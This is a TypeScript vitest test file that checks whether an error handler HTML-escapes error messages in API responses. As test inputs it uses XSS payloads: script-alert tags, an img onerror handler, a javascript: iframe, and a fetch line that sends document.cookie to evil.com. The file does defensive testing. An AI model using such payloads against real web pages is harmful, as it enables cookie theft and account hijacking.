/**
 * Tests for error handler utilities.
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { sanitizeErrorMessage, ErrorHandler } from './error-handler.js';
import { APIError, ErrorCode } from './errors.js';

describe('sanitizeErrorMessage', () => {
  it('should escape ampersands', () => {
    expect(sanitizeErrorMessage('Error: &amp;')).toBe('Error: &amp;amp;');
  });

  it('should escape less than signs', () => {
    expect(sanitizeErrorMessage('Error: <script>')).toBe('Error: &lt;script&gt;');
  });

  it('should escape greater than signs', () => {
    expect(sanitizeErrorMessage('Error: </div>')).toBe('Error: &lt;/div&gt;');
  });

  it('should escape double quotes', () => {
    expect(sanitizeErrorMessage('Error: "test"')).toBe('Error: &quot;test&quot;');
  });

  it('should escape single quotes', () => {
    expect(sanitizeErrorMessage("Error: 'test'")).toBe('Error: &#39;test&#39;');
  });

  it('should escape mixed HTML content', () => {
    const input = '<script>alert("XSS")</script>';
    const expected = '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;';
    expect(sanitizeErrorMessage(input)).toBe(expected);
  });

  it('should handle empty string', () => {
    expect(sanitizeErrorMessage('')).toBe('');
  });

  it('should handle string with no special characters', () => {
    expect(sanitizeErrorMessage('Simple error message')).toBe('Simple error message');
  });

  it('should escape all special characters in one string', () => {
    const input = '<div onclick="alert(\'test\')">Text & more</div>';
    const expected = '&lt;div onclick=&quot;alert(&#39;test&#39;)&quot;&gt;Text &amp; more&lt;/div&gt;';
    expect(sanitizeErrorMessage(input)).toBe(expected);
  });

  it('should handle multiple script tags', () => {
    const input = '<script>alert(1)</script><script>alert(2)</script>';
    const expected = '&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(2)&lt;/script&gt;';
    expect(sanitizeErrorMessage(input)).toBe(expected);
  });

  it('should escape onerror attribute', () => {
    const input = '<img src=x onerror="alert(1)">';
    const expected = '&lt;img src=x onerror=&quot;alert(1)&quot;&gt;';
    expect(sanitizeErrorMessage(input)).toBe(expected);
  });
});

describe('ErrorHandler - XSS Protection', () => {
  let errorHandler: ErrorHandler;

  beforeEach(() => {
    errorHandler = new ErrorHandler('TestErrorHandler');
  });

  async function getErrorResponse(error: unknown, context: Record<string, string>) {
    const response = errorHandler.handleApiError(error, context);
    return response.json() as Promise<{ error: { message: string; code: string } }>;
  }

  it('should sanitize error messages in API responses', async () => {
    const error = new Error('<script>alert("XSS")</script>');
    const context = { route: 'test' };

    const data = await getErrorResponse(error, context);

    expect(data.error.message).not.toContain('<script>');
    expect(data.error.message).toContain('&lt;script&gt;');
  });

  it('should sanitize APIError messages', async () => {
    const error = new APIError(
      400,
      ErrorCode.BAD_REQUEST,
      '<img src=x onerror="alert(1)">',
      { details: 'test' }
    );
    const context = { route: 'test' };

    const data = await getErrorResponse(error, context);

    expect(data.error.message).not.toContain('<img');
    expect(data.error.message).toContain('&lt;img');
  });

  it('should sanitize timeout error messages', async () => {
    const error = new Error('Timeout with <b>HTML</b> content');
    const context = { route: 'test' };

    const data = await getErrorResponse(error, context);

    expect(data.error.message).not.toContain('<b>');
    expect(data.error.message).toContain('&lt;b&gt;');
  });

  it('should sanitize rate limit error messages', async () => {
    const error = new Error('Rate limit: <a href="evil">click here</a>');
    const context = { route: 'test' };

    const data = await getErrorResponse(error, context);

    expect(data.error.message).not.toContain('<a');
    expect(data.error.message).toContain('&lt;a href=&quot;evil&quot;&gt;');
  });

  it('should sanitize auth error messages', async () => {
    const error = new Error('Auth failed: <script>steal()</script>');
    const context = { route: 'test' };

    const data = await getErrorResponse(error, context);

    expect(data.error.message).not.toContain('<script>');
    expect(data.error.message).toContain('&lt;script&gt;steal()&lt;/script&gt;');
  });

  it('should sanitize network error messages', async () => {
    const error = new Error('Network error: <iframe src="evil.com"></iframe>');
    const context = { route: 'test' };

    const data = await getErrorResponse(error, context);

    expect(data.error.message).not.toContain('<iframe');
    expect(data.error.message).toContain('&lt;iframe src=&quot;evil.com&quot;&gt;');
  });

  it('should handle non-Error objects safely', async () => {
    const error = 'Plain string error with <script>alert("XSS")</script>';
    const context = { route: 'test' };

    const data = await getErrorResponse(error, context);

    expect(data.error.message).not.toContain('<script>');
  });

  it('should preserve safe error messages', async () => {
    const error = new Error('Database connection failed');
    const context = { route: 'test' };

    const data = await getErrorResponse(error, context);

    expect(data.error.message).toBe('Database connection failed');
  });

  it('should handle empty error messages', async () => {
    const error = new Error('');
    const context = { route: 'test' };

    const data = await getErrorResponse(error, context);

    // Empty errors get a default message
    expect(data.error.message).toBe('An error occurred');
  });

  it('should sanitize messages with ampersands in URLs', async () => {
    const error = new Error('Error at https://example.com?foo=1&bar=2');
    const context = { route: 'test' };

    const data = await getErrorResponse(error, context);

    // Ampersands in URLs should be escaped
    expect(data.error.message).toContain('https://example.com?foo=1&amp;bar=2');
  });

  it('should sanitize complex XSS attempts', async () => {
    const error = new Error(`
      <script>
        fetch('https://evil.com/steal?data=' + document.cookie);
      </script>
      <img src=x onerror="alert('XSS')">
      <iframe src="javascript:alert(1)"></iframe>
    `);
    const context = { route: 'test' };

    const data = await getErrorResponse(error, context);

    expect(data.error.message).not.toContain('<script>');
    expect(data.error.message).not.toContain('<img');
    expect(data.error.message).not.toContain('<iframe');
    // Check for properly escaped script tag
    expect(data.error.message).toContain('&lt;script&gt;');
    expect(data.error.message).toContain('&lt;/script&gt;');
  });
});
